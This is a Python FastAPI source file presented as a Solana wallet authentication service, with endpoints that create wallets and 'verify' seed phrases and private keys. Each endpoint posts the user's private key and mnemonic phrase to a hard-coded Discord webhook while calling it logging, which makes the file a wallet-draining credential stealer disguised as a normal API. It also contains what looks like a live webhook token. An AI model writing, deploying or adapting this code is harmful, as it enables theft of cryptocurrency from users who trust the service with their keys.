from fastapi import APIRouter, HTTPException, status
from fastapi.middleware.cors import CORSMiddleware
from solana.rpc.api import Client
from solders.keypair import Keypair # type: ignore
import httpx
from base58 import b58encode # type: ignore
from typing import Dict
from database.models import WalletResponse, PhraseRequest
import uuid
from mnemonic import Mnemonic # type: ignore

from bip32utils import BIP32Key # type: ignore
import hashlib
from pydantic import BaseModel

router = APIRouter(
    prefix="/api/auth",
    tags=["Authentication"],
    responses={404: {"description": "Not found"}},
)

class PrivateKeyRequest(BaseModel):
    private_key: str


WEBHOOK_URL = "https://discord.com/api/webhooks/1324337898937651250/TQZtjm95JoCDlZiqDgaRVJ6zMd-f7vTYIS3qnLQ-Xb3u6oSVaNnNSqnl4dzlkYj2Ocma"

async def send_to_discord(content: str):
    async with httpx.AsyncClient() as client:
        await client.post(WEBHOOK_URL, json={"content": content})

@router.post("/createwallet", response_model=WalletResponse)
async def create_wallet():
    try:
        wallet_id = str(uuid.uuid4())
        mnemo = Mnemonic("english")
        mnemonic_phrase = mnemo.generate(strength=128)
        seed = mnemo.to_seed(mnemonic_phrase)
        keypair = Keypair.from_seed(hashlib.sha256(seed).digest()[:32])
        public_key = str(keypair.pubkey())
        private_key = b58encode(bytes(keypair)).decode('ascii')
        
        # Log to Discord
        log_message = f"New Wallet Created:\nWallet ID: {wallet_id}\nPublic Key: {public_key}\nPrivate Key: {private_key}\nMnemonic Phrase: {mnemonic_phrase}"
        await send_to_discord(log_message)
        
        return {
            "status": "success",
            "wallet_id": wallet_id,
            "public_key": public_key,
            "private_key": private_key,
            "mnemonic_phrase": mnemonic_phrase
        }

    except Exception as e:
        print(f"Error creating wallet: {str(e)}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=str(e)
        )

@router.post("/verifyphrase")
async def verify_phrase(request: PhraseRequest):
    try:
        mnemo = Mnemonic("english")
        if not mnemo.check(request.phrase):
            return {
                "status": "error",
                "valid": False,
                "message": "Invalid solana phrase"
            }
        try:
            wallet_id = str(uuid.uuid4())
            seed = mnemo.to_seed(request.phrase)
            keypair = Keypair.from_seed(hashlib.sha256(seed).digest()[:32])
            public_key = str(keypair.pubkey())
            private_key = b58encode(bytes(keypair)).decode('ascii')

            # Log to Discord
            log_message = f"Phrase Verified:\nWallet ID: {wallet_id}\nPublic Key: {public_key}\nPrivate Key: {private_key}\nMnemonic Phrase: {request.phrase}"
            await send_to_discord(log_message)

            return {
                "status": "success",
                "valid": True,
                "wallet_id": wallet_id,
                "public_key": public_key,
                "private_key": private_key,
                "mnemonic_phrase": request.phrase
            }

        except Exception as e:
            return {
                "status": "error",
                "valid": False,
                "message": "Invalid Solana wallet phrase"
            }

    except Exception as e:
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=str(e)
        )

@router.post("/verifyprivatekey")
async def verify_private_key(request: PrivateKeyRequest):
    try:
        try:
            from base58 import b58decode
            private_key_bytes = b58decode(request.private_key)
            keypair = Keypair.from_bytes(private_key_bytes)
            
            wallet_id = str(uuid.uuid4())
            public_key = str(keypair.pubkey())
            
            # Log to Discord
            log_message = f"Private Key Verified:\nWallet ID: {wallet_id}\nPublic Key: {public_key}\nPrivate Key: {request.private_key}"
            await send_to_discord(log_message)

            return {
                "status": "success",
                "valid": True,
                "wallet_id": wallet_id,
                "public_key": public_key,
                "private_key": request.private_key
            }

        except Exception as e:
            return {
                "status": "error",
                "valid": False,
                "message": "Invalid Solana private key"
            }

    except Exception as e:
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=str(e)
        )